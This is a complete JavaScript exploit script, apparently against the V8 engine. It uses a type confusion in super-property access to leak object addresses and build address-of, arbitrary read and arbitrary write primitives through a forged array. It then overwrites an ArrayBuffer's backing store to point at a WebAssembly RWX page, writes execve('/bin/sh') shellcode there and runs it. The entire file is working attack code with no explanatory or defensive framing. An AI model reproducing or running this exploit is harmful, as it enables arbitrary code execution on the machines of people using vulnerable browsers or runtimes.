var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);

function ftoi(f){
    f64[0] = f;
    return bigUint64[0];
}

function itof(i){
    bigUint64[0] = i;
    return f64[0];
}

function itof64(l, h){
    // console.log(ftoh(itof((BigInt(h) << 32n) + BigInt(l))))
    return itof((BigInt(h) << 32n) + BigInt(l))
}

function ftoh(f){
    return itoh(ftoi(f));
}

function itoh(i){
    var pad = 16;
    if (BigInt(i) < 0){
        i = BigInt(i) & 0xffffffffn    
    }
    if (BigInt(i) >> 32n == 0){
        pad = 8;
    }
    return '0x'+i.toString(16).padStart(pad, "0");
}

function leak_addrof_elements() {
    class O extends Object {
        constructor() {
            super()
            this.x0 = this
            this[0] = 0x41424344 / 2
            this[1] = 0x45464748 / 2
        }
        m() {
            return super.length
        }
    }

    const o = new O()

    function f() {
        const proto = new String("a")
        O.prototype.__proto__ = proto
        proto.length
        return o.m()
    }

    for (var i = 0; i < 0x100; ++i) {
        const value = f()
        if (value !== 1) {
            return [o, value-1]
        }
    }
}

var [o, o_fa_addr] = leak_addrof_elements()

const [t_read, addrOf] = (function () {
    class A extends Array {
        constructor() {
            super(1, 2)
        }
        m() {
            return super.length
        }
    }
    const a = new A()
    function f() {
        const proto = new String("a")
        A.prototype.__proto__ = proto
        proto.length
        return a.m()
    }

    for (let i = 0; i < 0x100; ++i) {
        const value = f()
        if (value !== 1) {
            break
        }
    }

    function read(addr) {
        a.length = (addr - 8) / 2
        const l3 = f(0)
        a.length = (addr - 8 + 2) / 2
        const h3 = f(0)
        return ((h3 << 8) & 0xff000000) + (l3 >> 8)
    }

    function addrOf(obj) {
        o[0] = obj
        return read(o_fa_addr + 8) - 1
    }

    return [read, addrOf]
})()



var fake_array = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
var fake_array_addr = addrOf(fake_array);
console.log('fake array addr:', itoh(fake_array_addr))
var fake_array_map = t_read(fake_array_addr);
console.log('fake array map:', itoh(fake_array_map))
var fake_array_prop = t_read(fake_array_addr + 4)
var fake_array_map_map = t_read(fake_array_map-1);
var fake_array_ele = t_read(fake_array_addr + 8);
console.log('fake array element addr:', itoh(fake_array_ele))
var fake_obj_addr = fake_array_ele + 8 + 32
console.log('fake obj addr:', itoh(fake_obj_addr))


fake_array[0] = itof64((fake_array_map_map & 0x00ffffff) << 8, (fake_array_map_map >> 24) & 0xff);
fake_array[1] = itof64(0, 0);
fake_array[2] = itof64((fake_obj_addr & 0x00ffffff) << 8, fake_obj_addr >> 24);
fake_array[3] = itof64(0, 0)
fake_array[4] = itof64(fake_array_map, fake_array_prop)
fake_array[5] = itof64(0xdeadbeef, 0x10);


const fake_obj = (function () {
    class A extends Array {
        constructor() {
            super(1, 2, 3, 4)
            this.x1 = 0x41414142 / 2
            this.x2 = 0x42424242 / 2
            this.x3 = 0x43434344 / 2
            this.x4 = (fake_array_ele + 8 + 2 - 1) / 2 
        }
        m() {
            return super.prototype
        }
    }

    const a = new A()

    function f() {
        const proto = function () {}
        A.prototype.__proto__ = proto
        proto.prototype
        return a.m()
    }

    for (var i = 0; i < 0x100; ++i) {
        const value = f()
        
    }

    return f()

}())


function read(addr, length=1){
    addr = BigInt(addr)
    addr -= 8n;
    if (addr % 2n == 0){
        addr += 1n;
    }
    fake_array[5] = itof64(addr, 0x10);
    var data = [] 
    for (var i = 0; i < length; i++){
        data.push(fake_obj[i]);
        console.log('read: ', itoh(addr + 8n * BigInt(i + 1) - 1n), ftoh(fake_obj[i]));
    }
    return data;
}


function write(addr, data){
    addr = BigInt(addr)
    addr -= 8n;
    if (addr % 2n == 0){
        addr += 1n;
    }
    fake_array[5] = itof64(addr, 0x10)
    fake_obj[0] = itof(data);
    console.log('write: ', itoh(addr - 1n + 8n), itoh(data));
}


function write_shellcode(shellcode, rwx_addr){
    var buf = new ArrayBuffer(shellcode.length * 8);
    var data_view = new DataView(buf);
    var buf_addr = addrOf(buf) & 0xffffffff;
    console.log('buf address: ', itoh(buf_addr));
    var back_store_addr_l = ftoi(read(buf_addr + 16)[0]);
    var back_store_addr_h = ftoi(read(buf_addr + 24)[0]);
    var rwx_addr_h = rwx_addr >> 32n;
    var rwx_addr_l = rwx_addr & 0xffffffffn;
    var new_bs_addr_l = (back_store_addr_l & 0xffffffffn) + (rwx_addr_l << 32n);
    var new_bs_addr_h = (back_store_addr_h >> 32n << 32n) + (rwx_addr_h);
    write(buf_addr + 16, new_bs_addr_l);
    write(buf_addr + 24, new_bs_addr_h);

    for (var i = 0; i < shellcode.length; i++){
        data_view.setFloat64(i * 8, itof(shellcode[i]), true);
    }
  
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module, {});
var shell = wasm_instance.exports.main;

var wasm_addr = (addrOf(wasm_instance));
console.log('wasm instance address: ', itoh(wasm_addr));
var rwx_addr = read((wasm_addr + 0x68))[0];
console.log('rwx address: ', ftoh(rwx_addr));

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];
write_shellcode(shellcode, ftoi(rwx_addr));

shell()
